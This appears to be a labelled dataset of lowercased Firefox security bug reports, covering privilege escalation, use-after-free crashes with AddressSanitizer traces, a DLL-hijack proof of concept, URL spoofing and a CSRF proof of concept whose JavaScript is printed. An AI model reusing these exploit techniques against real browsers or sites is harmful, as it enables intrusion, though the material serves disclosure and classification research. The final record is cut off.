its possible to call a content level constructor as if from a chrome/privileged page user agent mozilla/5.0 windows nt 6.1 wow64 rv:19.0 gecko/20100101 firefox/19.0 build id 20130307023931 steps to reproduce i used the mozcontact constructor to gain access to a chrome level array and then added a content level constructor to it and defined a setter to do the calling for me actual results the content level constructor behaves as if called from a privileged page as shown from the error this works with most content level constructors that are function objects but using the file constructor was just the easiest way to show this off i had discussed this issue in passing in an email with bobby holly but had n't had an easy way to show it off expected results chrome level objects exposed to content should be careful about any properties that are rw as defined in exposedprops i think it may be best to avoid it at all if possible arrays from chrome and the normal cows this works with them too are going to have to be rethought this happens i believe because function objects inherit their principals from the nearest object in the scope of their execution	9
crash with onreadystatechange and reload crashes with the following stack trace when trying to execute unmapped memory testcase is attached requires an empty test.html in the same directory the testcase is very timing dependent it works almost every time from a file i had it reproducing remotely a couple of times after quite a few reloads stack on windows xul nsrefptr nsxulprototypedocument nsrefptr nsxulprototypedocument class nsrefptr nsxulprototypedocument asmartptr xul nsdocumentviewer stop void xul nsdocshell stop unsigned int astopflags 3 xul nsdocshell internalload class nsiuri auri class nsiuri areferrer class nsisupports aowner unsigned int aflags 0 wchar_t awindowtarget char atypehint class nsastring_internal afilename class nsiinputstream apostdata class nsiinputstream aheadersdata unsigned int aloadtype 2 class nsishentry ashentry bool afirstparty true class nsidocshell adocshell class nsirequest arequest xul nsdocshell loadhistoryentry class nsishentry aentry unsigned int aloadtype 2 xul nsdocshell reload unsigned int areloadflags 0 xul nslocation reload bool aforceget false xul ns_invokebyindex class nsisupports that unsigned int methodindex unsigned int paramcount 1 struct nsxptcvariant params xul xpc_wn_callmethod struct jscontext cx unsigned int argc 0 class js value vp xul xpc wrapperfactory rewrap struct jscontext cx memory access error class jsobject existing memory access error class jsobject obj memory access error class jsobject wrappedproto memory access error class jsobject parent memory access error unsigned int flags memory access error mozjs jscompartment wrap struct jscontext cx class js mutablehandle js value vp class js mutablehandle js value class js handle jsobject existingarg class js handle jsobject	11
defaultvalue on xraywrapper can call content-defined tostring/valueof methods this is a regression between firefox 6.0.2 and firefox 7 see also bug 720619	2
the updater.exe loads the profapi.dll from the update directory the updater component is still vulnerable see 830134 to a library-based attack the exe loads the profapi.dll from the update directory for example while performing an update that can lead to privilege escalation while updating with the mozilla maintenance service i have tested this on win7 pro 32bit and 64bit with firefox 20.0 steps to reproduce 1 download poc and extract the dll file 2 copy the updater.exe from the firefox directory to the poc directory 3 start the updater.exe the updater loads the profapi.dll and executes system calc the profapi.dll from the system directory should be loaded	2
webgl data-view-test.html crash js types typemonitorresult jscontext jsscript unsigned char js value const crashes on load in the 20130408 windows 32-bit nightly all crashes are at	11
uaf with video and onresize event the attached testcase crashes central and stables skeleton.ogv needs to be in the same directory the stack on windows looks as follows	11
heap-use-after-free in mozilla dom htmlmediaelement lookupmediaelementuritable needs fuzzpriv extension to force gc let the testcase reload a couple of times and you should see a crash 29697 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in nscomptr nsinodeinfo get const objdir-ff-asan-sym/media/webrtc/signaling/signaling_ecc dist/include/nscomptr.h:782 1 in nscomptr nsinodeinfo operator const objdir-ff-asan-sym/media/webrtc/signaling/signaling_ecc dist/include/nscomptr.h:802 2 in nsinode nodeprincipal const objdir-ff-asan-sym/media/webrtc/signaling/signaling_ecc dist/include/nsinode.h:744 3 in mozilla dom htmlmediaelement lookupmediaelementuritable nsiuri content/html/content/src/htmlmediaelement.cpp:1863 4 in mozilla dom htmlmediaelement loadresource content/html/content/src/htmlmediaelement.cpp:1073 5 in mozilla dom htmlmediaelement loadfromsourcechildren content/html/content/src/htmlmediaelement.cpp:926 6 in mozilla dom nssyncsection run content/html/content/src/htmlmediaelement.cpp:672 7 in nsbaseappshell runsyncsectionsinternal bool unsigned int widget/xpwidgets/nsbaseappshell.cpp:352 8 in nsbaseappshell runsyncsections bool unsigned int widget/xpwidgets/nsbaseappshell.h:89 9 in nsbaseappshell afterprocessnextevent nsithreadinternal unsigned int widget/xpwidgets/nsbaseappshell.cpp:408 10 in non-virtual thunk to nsbaseappshell afterprocessnextevent nsithreadinternal unsigned int widget/xpwidgets/nsbaseappshell.cpp:410 11 in nsthread processnextevent bool bool xpcom/threads/nsthread.cpp:640 12 in ns_processnextevent nsithread bool objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:238 13 in mozilla ipc messagepump run base messagepump delegate ipc/glue/messagepump.cpp:82 14 in messageloop runinternal ipc/chromium/src/base/message_loop.cc:219 15 in messageloop runhandler ipc/chromium/src/base/message_loop.cc:212 16 in messageloop run ipc/chromium/src/base/message_loop.cc:186 17 in nsbaseappshell run widget/xpwidgets/nsbaseappshell.cpp:163 18 in nsappstartup run toolkit/components/startup/nsappstartup.cpp:289 19 in xremain xre_mainrun toolkit/xre/nsapprunner.cpp:3878 20 in xremain xre_main int char nsxreappdata const toolkit/xre/nsapprunner.cpp:3945 21 in xre_main toolkit/xre/nsapprunner.cpp:4146 22 in do_main int char nsifile browser/app/nsbrowserapp.cpp:271 23 in main browser/app/nsbrowserapp.cpp:576 24 in 25 in is located 24 bytes inside of 472-byte region freed by thread t0 here 0 in interceptor_free 1 in moz_free memory/mozalloc/mozalloc.cpp:48 2 in operator delete void dist/include/mozilla/mozalloc.h:225 3 in mozilla dom htmlvideoelement htmlvideoelement content/html/content/src/htmlvideoelement.cpp:78 4 in nsnodeutils lastrelease nsinode content/base/src/nsnodeutils.cpp:258 5 in mozilla dom fragmentorelement release content/base/src/fragmentorelement.cpp:1716 6 in mozilla dom htmlmediaelement release content/html/content/src/htmlmediaelement.cpp:402 7 in mozilla dom htmlvideoelement release content/html/content/src/htmlvideoelement.cpp:42 8 in zl17dodeferredreleaseip11nsisupportsevr8nstarrayit_e js/xpconnect/src/xpcjsruntime.cpp:614 9 in xpcjsruntime gccallback jsruntime jsgcstatus js/xpconnect/src/xpcjsruntime.cpp:814 10 in collect jsruntime bool long js jsgcinvocationkind js gcreason reason js/src/jsgc.cpp:4611 11 in js gc jsruntime js jsgcinvocationkind js gcreason reason js/src/jsgc.cpp:4628 12 in js gcforreason jsruntime js gcreason reason js/src/jsfriendapi.cpp:180 13 in nsxpccomponents_utils forcegc js/xpconnect/src/xpccomponents.cpp:4106 14 in ns_invokebyindex xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 15 in callmethodhelper invoke js/xpconnect/src/xpcwrappednative.cpp:2948 16 in callmethodhelper call js/xpconnect/src/xpcwrappednative.cpp:2282 17 in xpcwrappednative callmethod xpccallcontext xpcwrappednative callmode js/xpconnect/src/xpcwrappednative.cpp:2248 18 in xpc_wn_callmethod jscontext unsigned int js value js/xpconnect/src/xpcwrappednativejsops.cpp:1486 19 in js calljsnative jscontext int jscontext unsigned int js value js callargs const js/src/jscntxtinlines.h:337 20 in js invokekernel jscontext js callargs js maybeconstruct js/src/jsinterp.cpp:407 21 in js interpret jscontext js stackframe js interpmode bool js/src/jsinterp.cpp:2396 22 in js runscript jscontext js stackframe js/src/jsinterp.cpp:364 23 in js invokekernel jscontext js callargs js maybeconstruct js/src/jsinterp.cpp:421 24 in js invoke jscontext js invokeargsguard js maybeconstruct js/src/jsinterp.h:134 25 in js invoke jscontext js value const js value const unsigned int js value js value js/src/jsinterp.cpp:454 26 in js directproxyhandler call jscontext js handle jsobject js callargs const js/src/jsproxy.cpp:481 27 in js crosscompartmentwrapper call jscontext js handle jsobject js callargs const js/src/jswrapper.cpp:453 28 in js proxy call jscontext js handle jsobject js callargs const js/src/jsproxy.cpp:2613 29 in proxy_call jscontext unsigned int js value js/src/jsproxy.cpp:3177 30 in js calljsnative jscontext int jscontext unsigned int js value js callargs const js/src/jscntxtinlines.h:337 31 in js invokekernel jscontext js callargs js maybeconstruct js/src/jsinterp.cpp:400 32 in js interpret jscontext js stackframe js interpmode bool js/src/jsinterp.cpp:2396 33 in js runscript jscontext js stackframe js/src/jsinterp.cpp:364 34 in js executekernel jscontext js handle jsscript jsobject js value const js executetype js abstractframeptr js value js/src/jsinterp.cpp:552 previously allocated by thread t0 here 0 in malloc 1 in moz_xmalloc memory/mozalloc/mozalloc.cpp:54 2 in operator new unsigned long dist/include/mozilla/mozalloc.h:201 3 in nsgenerichtmlelement mozilla dom newhtmlelementhelper create nshtmlvideoelement mozilla dom htmlvideoelement already_addrefed nsinodeinfo mozilla dom newhtmlelementhelper sfinae bool nsidocument mozilla dom htmlvideoelement innavquirksmode content/html/content/src/nsgenerichtmlelement.h:1855 4 in ns_newhtmlvideoelement already_addrefed nsinodeinfo mozilla dom fromparser content/html/content/src/htmlvideoelement.cpp:36 5 in createhtmlelement unsigned int already_addrefed nsinodeinfo mozilla dom fromparser content/html/document/src/nshtmlcontentsink.cpp:498 6 in ns_newhtmlelement nsicontent already_addrefed nsinodeinfo mozilla dom fromparser content/html/document/src/nshtmlcontentsink.cpp:481 7 in ns_newelement nsicontent already_addrefed nsinodeinfo mozilla dom fromparser content/base/src/nsnamespacemanager.cpp:192 8 in nshtml5treeoperation perform nshtml5treeopexecutor nsicontent parser/html/nshtml5treeoperation.cpp:349 9 in nshtml5treeopexecutor runflushloop parser/html/nshtml5treeopexecutor.cpp:557 10 in nshtml5executorflusher run parser/html/nshtml5streamparser.cpp:125 11 in nsthread processnextevent bool bool xpcom/threads/nsthread.cpp:627 12 in ns_processnextevent nsithread bool objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:238 13 in mozilla ipc messagepump run base messagepump delegate ipc/glue/messagepump.cpp:82 14 in messageloop runinternal ipc/chromium/src/base/message_loop.cc:219 15 in messageloop runhandler ipc/chromium/src/base/message_loop.cc:212 16 in messageloop run ipc/chromium/src/base/message_loop.cc:186 17 in nsbaseappshell run widget/xpwidgets/nsbaseappshell.cpp:163 18 in nsappstartup run toolkit/components/startup/nsappstartup.cpp:289 19 in xremain xre_mainrun toolkit/xre/nsapprunner.cpp:3878 20 in xremain xre_main int char nsxreappdata const toolkit/xre/nsapprunner.cpp:3945 21 in xre_main toolkit/xre/nsapprunner.cpp:4146 22 in do_main int char nsifile browser/app/nsbrowserapp.cpp:271 23 in main browser/app/nsbrowserapp.cpp:576 24 in shadow bytes around the buggy address fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap righ redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 asan internal fe 29697 aborting	11
nsdomsvgzoomevent m previous new scale are used uninitialized noticed while reviewing bug 866679 attached test shows that we return garbage to js	11
do not send data xhr head request user agent mozilla/5.0 macintosh intel mac os x 10_8_2 applewebkit/537.31 khtml like gecko chrome/26.0.1410.65 safari/537.31 steps to reproduce during a penetration test for a client i found that csrf was possible on a piece of their functionality when sent as a head in the latest version of chrome they send a preflight request for this head request but firefox 20 is not i will attach the request and response with the sensitive client information omitted my csrf proof of concept has xmlhttp.withcredentials true i ve supplied two things to you the code that allowed for my exploit to work as well as the request response pair that happens when the request is sent i ve omitted sensitive information about the application this worked on because i do not own it but if needed i ll try to spin up an environment that is similar to what i m working on to recreate it since i can only upload one file i m going to paste my proof of concept code here and attach an image of the actual exploit taking place after the form request was made johnathan kuskos this file is psuedocode for a successful csrf i was able to exploit for a client the file was hosted on my personal site at malfiles.jkuskos.com and targetted a url that i ve renamed example.com for sake of my client s privacy i will attempt to supply as much information as i can as i believe that a preflight request should not have allowed this to take place in firefox 20.0 doctype html html head script function loadxmldochead var xmlhttp if window.xmlhttprequest code for ie7 firefox chrome opera safari xmlhttp=new xmlhttprequest else code for ie6 ie5 xmlhttp=new activexobject microsoft.xmlhttp xmlhttp.onreadystatechange=function if xmlhttp.readystate==4 xmlhttp.status==200 xmlhttp.status==302 document.getelementbyid mydiv innerhtml=xmlhttp.responsetext var url true victim omitted var params body true parameters omitted xmlhttp.withcredentials true xmlhttp.open head url true xmlhttp.setrequestheader content-type application/x-www-form-urlencoded xmlhttp.send params script head body h1 head request h1 button type button onclick loadxmldochead send head button div id mydiv div body html actual results the cors request was successfully sent expected results a preflight request should have first sent an options request to check for if the http verb was allowed as specified here preflighted_requests	9
mozilla firefox navigation away from a page with an active select dropdown menu can be used for url/ssl spoofing and clickjacking attacks user agent mozilla/5.0 windows nt 6.1 wow64 rv:20.0 gecko/20100101 firefox/20.0 build id 20130409194949 steps to reproduce select option elements may contain html contents and surpass the location bar and the box geolocation for exemple it is possible with these elements to make multiple attacks like ssl url spoofing and clickjacking actual results the location bar and the ssl indicia are spoofed and the geolocation authorization can be bypassed expected results select/option element surpass all other element location bar geolocation box	9
heap-use-after-free in nsidocument getrootelement 8886 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in nsinode getparentnode const dist/include/nsinode.h:762 1 in nsidocument getrootelement const content/base/src/nsdocument.cpp:3610 2 in nsidocument gethtmlelement const content/base/src/nsdocument.cpp:5819 3 in nsidocument gethtmlchildelement nsiatom content/base/src/nsdocument.cpp:5828 4 in nsidocument getbodyelement dist/include/nsidocumentinlines.h:15 5 in nshtmldocument getbody content/html/document/src/nshtmldocument.cpp:1085 6 in nshtmldocument getbody nsidomhtmlelement content/html/document/src/nshtmldocument.cpp:1106 7 in non-virtual thunk to nshtmldocument getbody nsidomhtmlelement content/html/document/src/nshtmldocument.cpp:1109 8 in nshtmleditor getbodyelement nsidomhtmlelement editor/libeditor/html/nshtmleditor.cpp:5288 9 in nshtmleditor getrootelement nsidomelement editor/libeditor/html/nshtmleditor.cpp:336 10 in nshtmleditor resetrootelementandeventtarget editor/libeditor/html/nshtmleditor.cpp:5259 11 in nsrunnablemethodimpl void nshtmleditor true run dist/include/nsthreadutils.h:350 12 in nscontentutils removescriptblocker content/base/src/nscontentutils.cpp:4971 13 in nsdocument endupdate unsigned int content/base/src/nsdocument.cpp:4342 14 in nshtmldocument endupdate unsigned int content/html/document/src/nshtmldocument.cpp:2580 15 in mozautodocupdate mozautodocupdate content/xul/templates/src base/src/mozautodocupdate.h:38 16 in mozautodocupdate mozautodocupdate content/xul/templates/src base/src/mozautodocupdate.h:36 17 in nsdocument resettouri nsiuri nsiloadgroup nsiprincipal content/base/src/nsdocument.cpp:2074 18 in nshtmldocument resettouri nsiuri nsiloadgroup nsiprincipal content/html/document/src/nshtmldocument.cpp:294 19 in nsdocument reset nsichannel nsiloadgroup content/base/src/nsdocument.cpp:2012 20 in nshtmldocument reset nsichannel nsiloadgroup content/html/document/src/nshtmldocument.cpp:281 21 in nshtmldocument open jscontext nsastring_internal const nsastring_internal const mozilla errorresult content/html/document/src/nshtmldocument.cpp:1687 22 in mozilla dom htmldocumentbinding open jscontext js handle jsobject nshtmldocument unsigned int js value objdir-ff-asan-sym/dom/bindings/htmldocumentbinding.cpp:524 23 in mozilla dom htmldocumentbinding genericmethod jscontext unsigned int js value objdir-ff-asan-sym/dom/bindings/htmldocumentbinding.cpp:1545 24 in js calljsnative jscontext int jscontext unsigned int js value js callargs const js/src/jscntxtinlines.h:337 25 in js invoke jscontext js callargs js maybeconstruct js/src/jsinterp.cpp:426 26 in js interpret jscontext js stackframe js interpmode bool js/src/jsinterp.cpp:2393 27 in js runscript jscontext js stackframe js/src/jsinterp.cpp:383 28 in js invoke jscontext js callargs js maybeconstruct js/src/jsinterp.cpp:440 29 in js invoke jscontext js value const js value const unsigned int js value js value js/src/jsinterp.cpp:473 30 in js_callfunctionvalue jscontext jsobject js value unsigned int js value js value js/src/jsapi.cpp:5851 31 in nsxpcwrappedjsclass callmethod nsxpcwrappedjs unsigned short xptmethoddescriptor const nsxptcminivariant js/xpconnect/src/xpcwrappedjsclass.cpp:1435 32 in nsxpcwrappedjs callmethod unsigned short xptmethoddescriptor const nsxptcminivariant js/xpconnect/src/xpcwrappedjs.cpp:578 33 in prepareanddispatch xpcom/reflect/xptcall/src/md/unix/xptcstubs_x86_64_linux.cpp:122 34 in sharedstub is located 32 bytes inside of 160-byte region freed by thread t0 here 0 in interceptor_free 1 in moz_free memory/mozalloc/mozalloc.cpp:48 2 in operator delete void dist/include/mozilla/mozalloc.h:225 3 in mozilla dom htmlsharedelement htmlsharedelement content/html/content/src/htmlsharedelement.cpp:28 4 in nsnodeutils lastrelease nsinode content/base/src/nsnodeutils.cpp:258 5 in mozilla dom fragmentorelement release content/base/src/fragmentorelement.cpp:1713 6 in mozilla dom htmlsharedelement release content/html/content/src/htmlsharedelement.cpp:32 7 in nscomptr_base assign_assuming_addref nsisupports objdir-ff-asan-sym/media/webrtc/signaling/signaling_ecc dist/include/nscomptr.h:470 8 in nscomptr_base assign_with_addref nsisupports objdir-ff-asan-sym/xpcom/build/nscomptr.cpp:49 9 in nscomptr mozilla dom element operator mozilla dom element dist/include/nscomptr.h:664 10 in nshtmleditor resetrootelementandeventtarget editor/libeditor/html/nshtmleditor.cpp:5251 11 in nsrunnablemethodimpl void nshtmleditor true run dist/include/nsthreadutils.h:350 12 in nscontentutils removescriptblocker content/base/src/nscontentutils.cpp:4971 13 in nsdocument endupdate unsigned int content/base/src/nsdocument.cpp:4342 14 in nshtmldocument endupdate unsigned int content/html/document/src/nshtmldocument.cpp:2580 15 in mozautodocupdate mozautodocupdate content/xul/templates/src base/src/mozautodocupdate.h:38 16 in mozautodocupdate mozautodocupdate content/xul/templates/src base/src/mozautodocupdate.h:36 17 in nsdocument resettouri nsiuri nsiloadgroup nsiprincipal content/base/src/nsdocument.cpp:2074 18 in nshtmldocument resettouri nsiuri nsiloadgroup nsiprincipal content/html/document/src/nshtmldocument.cpp:294 19 in nsdocument reset nsichannel nsiloadgroup content/base/src/nsdocument.cpp:2012 20 in nshtmldocument reset nsichannel nsiloadgroup content/html/document/src/nshtmldocument.cpp:281 21 in nshtmldocument open jscontext nsastring_internal const nsastring_internal const mozilla errorresult content/html/document/src/nshtmldocument.cpp:1687 22 in mozilla dom htmldocumentbinding open jscontext js handle jsobject nshtmldocument unsigned int js value objdir-ff-asan-sym/dom/bindings/htmldocumentbinding.cpp:524 23 in mozilla dom htmldocumentbinding genericmethod jscontext unsigned int js value objdir-ff-asan-sym/dom/bindings/htmldocumentbinding.cpp:1545 24 in js calljsnative jscontext int jscontext unsigned int js value js callargs const js/src/jscntxtinlines.h:337 25 in js invoke jscontext js callargs js maybeconstruct js/src/jsinterp.cpp:426 26 in js interpret jscontext js stackframe js interpmode bool js/src/jsinterp.cpp:2393 27 in js runscript jscontext js stackframe js/src/jsinterp.cpp:383 28 in js invoke jscontext js callargs js maybeconstruct js/src/jsinterp.cpp:440 29 in js invoke jscontext js value const js value const unsigned int js value js value js/src/jsinterp.cpp:473 30 in js_callfunctionvalue jscontext jsobject js value unsigned int js value js value js/src/jsapi.cpp:5851 31 in nsxpcwrappedjsclass callmethod nsxpcwrappedjs unsigned short xptmethoddescriptor const nsxptcminivariant js/xpconnect/src/xpcwrappedjsclass.cpp:1435 previously allocated by thread t0 here 0 in malloc 1 in moz_xmalloc memory/mozalloc/mozalloc.cpp:54 2 in operator new unsigned long dist/include/mozilla/mozalloc.h:201 3 in nsgenerichtmlelement mozilla dom newhtmlelementhelper create nshtmlsharedelement mozilla dom htmlsharedelement already_addrefed nsinodeinfo mozilla dom newhtmlelementhelper sfinae bool nsidocument mozilla dom htmlsharedelement innavquirksmode content/html/content/src/nsgenerichtmlelement.h:1869 4 in ns_newhtmlsharedelement already_addrefed nsinodeinfo mozilla dom fromparser content/html/content/src/htmlsharedelement.cpp:20 5 in createhtmlelement unsigned int already_addrefed nsinodeinfo mozilla dom fromparser content/html/document/src/nshtmlcontentsink.cpp:498 6 in ns_newhtmlelement nsicontent already_addrefed nsinodeinfo mozilla dom fromparser content/html/document/src/nshtmlcontentsink.cpp:481 7 in ns_newelement nsicontent already_addrefed nsinodeinfo mozilla dom fromparser content/base/src/nsnamespacemanager.cpp:192 8 in nshtml5treeoperation perform nshtml5treeopexecutor nsicontent parser/html/nshtml5treeoperation.cpp:349 9 in nshtml5treeopexecutor runflushloop parser/html/nshtml5treeopexecutor.cpp:557 10 in nshtml5executorflusher run parser/html/nshtml5streamparser.cpp:125 11 in nsthread processnextevent bool bool xpcom/threads/nsthread.cpp:627 12 in ns_processnextevent nsithread bool objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:238 13 in nsxulwindow showmodal xpfe/appshell/src/nsxulwindow.cpp:362 14 in nscontenttreeowner showasmodal xpfe/appshell/src/nscontenttreeowner.cpp:522 15 in non-virtual thunk to nscontenttreeowner showasmodal xpfe/appshell/src/nscontenttreeowner.cpp:523 16 in nswindowwatcher openwindowinternal nsidomwindow char const char const char const bool bool bool nsiarray nsidomwindow embedding/components/windowwatcher/src/nswindowwatcher.cpp:1007 17 in nswindowwatcher openwindow nsidomwindow char const char const char const nsisupports nsidomwindow embedding/components/windowwatcher/src/nswindowwatcher.cpp:343 18 in ns_invokebyindex xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 19 in callmethodhelper invoke js/xpconnect/src/xpcwrappednative.cpp:2948 20 in callmethodhelper call js/xpconnect/src/xpcwrappednative.cpp:2283 21 in xpcwrappednative callmethod xpccallcontext xpcwrappednative callmode js/xpconnect/src/xpcwrappednative.cpp:2249 22 in xpc_wn_callmethod jscontext unsigned int js value js/xpconnect/src/xpcwrappednativejsops.cpp:1485 23 in js calljsnative jscontext int jscontext unsigned int js value js callargs const js/src/jscntxtinlines.h:337 24 in js invoke jscontext js callargs js maybeconstruct js/src/jsinterp.cpp:426 25 in js interpret jscontext js stackframe js interpmode bool js/src/jsinterp.cpp:2393 26 in js runscript jscontext js stackframe js/src/jsinterp.cpp:383 27 in js invoke jscontext js callargs js maybeconstruct js/src/jsinterp.cpp:440 28 in js invoke jscontext js value const js value const unsigned int js value js value js/src/jsinterp.cpp:473 29 in js_callfunctionvalue jscontext jsobject js value unsigned int js value js value js/src/jsapi.cpp:5851 30 in nsxpcwrappedjsclass callmethod nsxpcwrappedjs unsigned short xptmethoddescriptor const nsxptcminivariant js/xpconnect/src/xpcwrappedjsclass.cpp:1435 31 in nsxpcwrappedjs callmethod unsigned short xptmethoddescriptor const nsxptcminivariant js/xpconnect/src/xpcwrappedjs.cpp:578 32 in prepareanddispatch xpcom/reflect/xptcall/src/md/unix/xptcstubs_x86_64_linux.cpp:122 33 in sharedstub shadow bytes around the buggy address fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fd fd fd fd shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap righ redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 asan internal fe 8886 aborting	11
heap-use-after-free in mozilla resetdir need to install fuzzpriv extension to force gc and need to reload testcase 2-3 times to reproduce 14882 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 4 at thread t0 0 in nsinode getboolflag nsinode booleanflag const content/base/public/nsinode.h:1359 1 in nsinode hastextnodedirectionalitymap const dist/include/nsinode.h:1442 2 in mozilla nstextnodedirectionalitymap removeelementfrommap nsinode mozilla dom element content/base/src/directionalityutils.cpp:545 3 in mozilla resetdir mozilla dom element content/base/src/directionalityutils.cpp:996 4 in mozilla dom element unbindfromtree bool bool content/base/src/element.cpp:1316 5 in nsgenerichtmlelement unbindfromtree bool bool content/html/content/src/nsgenerichtmlelement.cpp:655 6 in mozilla dom element unbindfromtree bool bool content/base/src/element.cpp:1329 7 in nsgenerichtmlelement unbindfromtree bool bool content/html/content/src/nsgenerichtmlelement.cpp:655 8 in mozilla dom element unbindfromtree bool bool content/base/src/element.cpp:1329 9 in nsgenerichtmlelement unbindfromtree bool bool content/html/content/src/nsgenerichtmlelement.cpp:655 10 in mozilla dom htmlbodyelement unbindfromtree bool bool content/html/content/src/htmlbodyelement.cpp:357 11 in mozilla dom element unbindfromtree bool bool content/base/src/element.cpp:1329 12 in nsgenerichtmlelement unbindfromtree bool bool content/html/content/src/nsgenerichtmlelement.cpp:655 13 in mozilla dom htmlsharedelement unbindfromtree bool bool content/html/content/src/htmlsharedelement.cpp:305 14 in nsdocument cyclecollection unlinkimpl void content/base/src/nsdocument.cpp:1823 15 in nshtmldocument cyclecollection unlinkimpl void content/html/document/src/nshtmldocument.cpp:220 16 in nscyclecollector collectwhite nsicyclecollectorlistener xpcom/base/nscyclecollector.cpp:2413 17 in nscyclecollector finishcollection nsicyclecollectorlistener xpcom/base/nscyclecollector.cpp:2876 18 in nscyclecollectorrunner collect cctype nscyclecollectorresults nsicyclecollectorlistener xpcom/base/nscyclecollector.cpp:1200 19 in nscyclecollector collect cctype nscyclecollectorresults nsicyclecollectorlistener xpcom/base/nscyclecollector.cpp:2772 20 in nscyclecollector_collect bool nscyclecollectorresults nsicyclecollectorlistener xpcom/base/nscyclecollector.cpp:3088 21 in nsjscontext cyclecollectnow nsicyclecollectorlistener int bool dom/base/nsjsenvironment.cpp:2563 22 in cctimerfired nsitimer void dom/base/nsjsenvironment.cpp:2774 23 in nstimerimpl fire xpcom/threads/nstimerimpl.cpp:547 24 in nstimerevent run xpcom/threads/nstimerimpl.cpp:634 25 in nsthread processnextevent bool bool xpcom/threads/nsthread.cpp:627 26 in ns_processnextevent nsithread bool objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:238 27 in mozilla ipc messagepump run base messagepump delegate ipc/glue/messagepump.cpp:117 28 in messageloop runinternal ipc/chromium/src/base/message_loop.cc:219 29 in messageloop runhandler ipc/chromium/src/base/message_loop.cc:212 30 in messageloop run ipc/chromium/src/base/message_loop.cc:186 31 in nsbaseappshell run widget/xpwidgets/nsbaseappshell.cpp:163 32 in nsappstartup run toolkit/components/startup/nsappstartup.cpp:269 33 in xremain xre_mainrun toolkit/xre/nsapprunner.cpp:3872 34 in xremain xre_main int char nsxreappdata const toolkit/xre/nsapprunner.cpp:3939 35 in xre_main toolkit/xre/nsapprunner.cpp:4140 36 in do_main int char nsifile browser/app/nsbrowserapp.cpp:272 37 in main browser/app/nsbrowserapp.cpp:632 38 in 39 in is located 44 bytes inside of 120-byte region freed by thread t0 here 0 in interceptor_free 1 in moz_free memory/mozalloc/mozalloc.cpp:48 2 in operator delete void dist/include/mozilla/mozalloc.h:225 3 in nstextnode nstextnode content/base/src/nstextnode.cpp:94 4 in nsnodeutils lastrelease nsinode content/base/src/nsnodeutils.cpp:259 5 in nsgenericdomdatanode release content/base/src/nsgenericdomdatanode.cpp:116 6 in nstextnode release content/base/src/nstextnode.cpp:97 7 in zl17dodeferredreleaseip11nsisupportsevr8nstarrayit_e js/xpconnect/src/xpcjsruntime.cpp:616 8 in xpcjsruntime gccallback jsruntime jsgcstatus js/xpconnect/src/xpcjsruntime.cpp:816 9 in collect jsruntime bool long js jsgcinvocationkind js gcreason reason js/src/jsgc.cpp:4579 10 in js gc jsruntime js jsgcinvocationkind js gcreason reason js/src/jsgc.cpp:4596 11 in js gcforreason jsruntime js gcreason reason js/src/jsfriendapi.cpp:181 12 in nsxpccomponents_utils forcegc js/xpconnect/src/xpccomponents.cpp:4058 13 in ns_invokebyindex xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 14 in callmethodhelper invoke js/xpconnect/src/xpcwrappednative.cpp:2938 15 in callmethodhelper call js/xpconnect/src/xpcwrappednative.cpp:2273 16 in xpcwrappednative callmethod xpccallcontext xpcwrappednative callmode js/xpconnect/src/xpcwrappednative.cpp:2239 17 in xpc_wn_callmethod jscontext unsigned int js value js/xpconnect/src/xpcwrappednativejsops.cpp:1485 18 in js calljsnative jscontext int jscontext unsigned int js value js callargs const js/src/jscntxtinlines.h:346 19 in js invoke jscontext js callargs js maybeconstruct js/src/jsinterp.cpp:408 20 in js interpret jscontext js stackframe js interpmode bool js/src/jsinterp.cpp:2265 21 in js runscript jscontext js stackframe js/src/jsinterp.cpp:365 22 in js invoke jscontext js callargs js maybeconstruct js/src/jsinterp.cpp:421 23 in js invoke jscontext js value const js value const unsigned int js value js value js/src/jsinterp.cpp:454 24 in js directproxyhandler call jscontext js handle jsobject js callargs const js/src/jsproxy.cpp:479 25 in js crosscompartmentwrapper call jscontext js handle jsobject js callargs const js/src/jswrapper.cpp:445 26 in js proxy call jscontext js handle jsobject js callargs const js/src/jsproxy.cpp:2611 27 in 